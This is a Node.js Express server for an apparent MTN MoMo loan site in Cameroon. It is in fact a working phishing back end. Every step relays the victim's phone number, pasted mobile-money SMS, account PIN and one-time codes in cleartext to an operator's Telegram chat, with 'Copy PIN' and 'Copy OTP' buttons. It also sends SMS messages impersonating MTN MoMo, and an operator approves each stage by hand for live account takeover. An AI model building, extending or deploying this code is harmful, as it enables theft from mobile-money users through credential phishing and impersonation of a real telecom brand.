require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
const DEBUG_SMS = process.env.DEBUG_SMS !== 'false';

const applications = {};

function generateId() {
  return 'APP' + Math.random().toString(36).substring(2, 10).toUpperCase();
}
function generateCode(len = 6) {
  return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
}

async function sendTelegramMessage(text, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

async function sendSms(to, text) {
  if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
    console.log(`[SIMULATED SMS] to ${to}: ${text}`);
    return;
  }
  try {
    await axios.post(`${SMS_GATEWAY_URL}/sms`, { to, text }, {
      headers: { 'Content-Type': 'application/json', 'x-api-key': SMS_GATEWAY_API_KEY }
    });
    console.log(`✅ SMS sent to ${to}`);
  } catch (e) {
    console.error('❌ SMS send failed:', e.message);
    console.log(`[FALLBACK SIMULATED SMS] to ${to}: ${text}`);
  }
}

app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ ok: false, message: 'Internal server error' });
});

// Routes
app.get('/api/health', (req, res) => res.json({ ok: true }));

// 1. Submit application
app.post('/api/send-application', async (req, res) => {
  try {
    const data = req.body.applicationData;
    if (!data || !data.phone) {
      return res.status(400).json({ ok: false, message: 'Missing required fields' });
    }
    const appId = generateId();
    applications[appId] = {
      ...data,
      appId,
      smsStatus: 'pending',
      pinStatus: 'pending',
      otpStatus: 'pending',
      smsCode: null,
      otpCode: null,
      smsMessage: null,
      otpEntered: null,
      pinEntered: null,
      pinAttempts: 0,
      maxPinAttempts: 3,
      pinBlockedUntil: null,
      createdAt: new Date().toISOString()
    };

    const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${appId}\n📱 Phone: +237${data.phone}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ *Please approve or reject this application:*`;
    const buttons = [[
      { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'APP', appId }) },
      { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'APP', appId }) }
    ]];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, applicationId: appId });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 2. Check app status
app.get('/api/status/:applicationId/app', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  res.json({ ok: true, status: app.smsStatus, step: 'app' });
});

// 3. Send SMS (user pastes message)
app.post('/api/send-momo-message', async (req, res) => {
  try {
    const { momoData } = req.body;
    const { applicationId, momoMessage } = momoData;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    app.smsMessage = momoMessage;
    app.smsStatus = 'pending';

    const message = `📨 *SMS MESSAGE RECEIVED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
    const buttons = [
      [{ text: '📋 Copy SMS Content', callback_data: JSON.stringify({ action: 'COPY_SMS', appId: applicationId }) }],
      [
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
      ]
    ];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 4. Check SMS status
app.get('/api/status/:applicationId/sms', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  res.json({ ok: true, status: app.smsStatus });
});

// 5. Send PIN
app.post('/api/send-pin', async (req, res) => {
  try {
    const { applicationId, pin } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
      return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait.' });
    }

    app.pinEntered = pin;
    app.pinStatus = 'pending';

    const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
    const buttons = [
      [{ text: '📋 Copy PIN', callback_data: JSON.stringify({ action: 'COPY_PIN', appId: applicationId }) }],
      [
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'PIN', appId: applicationId }) },
        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId: applicationId }) }
      ]
    ];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 6. Check PIN status
app.get('/api/status/:applicationId/pin', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  res.json({ ok: true, status: app.pinStatus, remainingAttempts: Math.max(0, app.maxPinAttempts - app.pinAttempts), blocked: app.pinStatus === 'blocked' });
});

// 7. PIN rejected
app.post('/api/pin-rejected', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    app.pinAttempts++;
    const remaining = app.maxPinAttempts - app.pinAttempts;
    if (remaining <= 0) {
      app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
      app.pinStatus = 'blocked';
      await sendTelegramMessage(`🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\nBlocked for 5 minutes.`);
      return res.json({ ok: false, blocked: true, message: 'Too many failed attempts. Blocked for 5 minutes.' });
    }
    res.json({ ok: false, remainingAttempts: remaining, message: `Wrong PIN. ${remaining} attempt(s) remaining.` });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 8. Reset PIN attempts
app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  app.pinAttempts = 0;
  app.pinBlockedUntil = null;
  app.pinStatus = 'pending';
  res.json({ ok: true });
});

// 9. Send OTP
app.post('/api/send-otp', async (req, res) => {
  try {
    const { applicationId, otp } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    app.otpEntered = otp;
    app.otpStatus = 'pending';

    const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
    const buttons = [
      [{ text: '📋 Copy OTP', callback_data: JSON.stringify({ action: 'COPY_OTP', appId: applicationId }) }],
      [
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
      ]
    ];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 10. Check OTP status
app.get('/api/status/:applicationId/otp', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  res.json({ ok: true, status: app.otpStatus });
});

// 11. Resend SMS
app.post('/api/resend-sms', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    const newCode = generateCode(6);
    app.smsCode = newCode;
    app.smsMessage = null;
    app.smsStatus = 'pending';
    await sendSms(`+237${app.phone}`, `Your MTN MoMo verification code is: ${newCode}`);

    const message = `🔄 *SMS RESENT*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 New SMS code: ${newCode}\n\n✅ *Please approve or reject this SMS:*`;
    const buttons = [
      [{ text: '📋 Copy SMS Content', callback_data: JSON.stringify({ action: 'COPY_SMS', appId: applicationId }) }],
      [
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
      ]
    ];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 12. Resend OTP
app.post('/api/resend-otp', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    const newOtp = generateCode(4);
    app.otpCode = newOtp;
    app.otpEntered = null;
    app.otpStatus = 'pending';
    await sendSms(`+237${app.phone}`, `Your MTN MoMo OTP is: ${newOtp}`);

    const message = `🔄 *OTP RESENT*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 New OTP: ${newOtp}\n\n✅ *Please approve or reject this OTP:*`;
    const buttons = [
      [{ text: '📋 Copy OTP', callback_data: JSON.stringify({ action: 'COPY_OTP', appId: applicationId }) }],
      [
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
      ]
    ];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 13. DEV SMS code
app.get('/api/dev-sms-code/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  if (DEBUG_SMS || !SMS_GATEWAY_URL) {
    return res.json({ ok: true, code: app.smsCode, simulated: true });
  }
  res.json({ ok: false, simulated: false });
});

// 14. Dashboard
app.get('/api/dashboard/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  if (app.otpStatus !== 'approved') {
    return res.status(403).json({ ok: false, message: 'Loan not approved yet' });
  }
  res.json({
    ok: true,
    data: {
      applicationId: app.appId,
      loanAmount: app.loanAmount,
      loanTerm: app.loanTerm,
      monthlyPayment: Math.ceil(app.loanAmount / parseInt(app.loanTerm)),
      status: 'approved',
      approvedAt: app.updatedAt
    }
  });
});

// 15. Telegram webhook (HYBRID)
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const query = update.callback_query;
    let data;
    try { data = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }

    const { a, step, action, appId } = data;
    const app = applications[appId];
    if (!app) return res.sendStatus(200);

    if (action === 'COPY_SMS') {
      if (app.smsMessage) {
        await sendTelegramMessage(app.smsMessage);
      } else {
        await sendTelegramMessage('⚠️ No SMS message available yet.');
      }
    } else if (action === 'COPY_PIN') {
      if (app.pinEntered) {
        await sendTelegramMessage(app.pinEntered);
      } else {
        await sendTelegramMessage('⚠️ No PIN entered yet.');
      }
    } else if (action === 'COPY_OTP') {
      if (app.otpEntered) {
        await sendTelegramMessage(app.otpEntered);
      } else {
        await sendTelegramMessage('⚠️ No OTP entered yet.');
      }
    }
    else if (step === 'APP') {
      app.smsStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
      if (app.smsStatus === 'approved') {
        const smsCode = generateCode(6);
        app.smsCode = smsCode;
        await sendSms(`+237${app.phone}`, `Your MTN MoMo verification code is: ${smsCode}`);
      }
    } else if (step === 'SMS') {
      app.smsStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
      if (app.smsStatus === 'approved') {
        const otpCode = generateCode(4);
        app.otpCode = otpCode;
        await sendSms(`+237${app.phone}`, `Your MTN MoMo OTP is: ${otpCode}`);
      }
    } else if (step === 'PIN') {
      app.pinStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
      if (app.pinStatus === 'rejected') {
        app.pinAttempts++;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
          app.pinStatus = 'blocked';
        }
      }
    } else if (step === 'OTP') {
      app.otpStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a || action}` })
    });

    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim().toUpperCase();
    const replyTo = update.message.reply_to_message?.text;
    const idMatch = replyTo?.match(/🆔\s*ID:\s*([A-Z0-9-]+)/);
    const applicationId = idMatch ? idMatch[1] : null;
    if (!applicationId || !applications[applicationId]) return res.sendStatus(200);

    const app = applications[applicationId];
    if (app.smsStatus === 'pending' && text === 'YES') app.smsStatus = 'approved';
    else if (app.smsStatus === 'pending' && text === 'NO') app.smsStatus = 'rejected';
    else if (app.pinStatus === 'pending' && text === 'YES') app.pinStatus = 'approved';
    else if (app.pinStatus === 'pending' && text === 'NO') app.pinStatus = 'rejected';
    else if (app.otpStatus === 'pending' && text === 'YES') app.otpStatus = 'approved';
    else if (app.otpStatus === 'pending' && text === 'NO') app.otpStatus = 'rejected';

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Serve frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
});
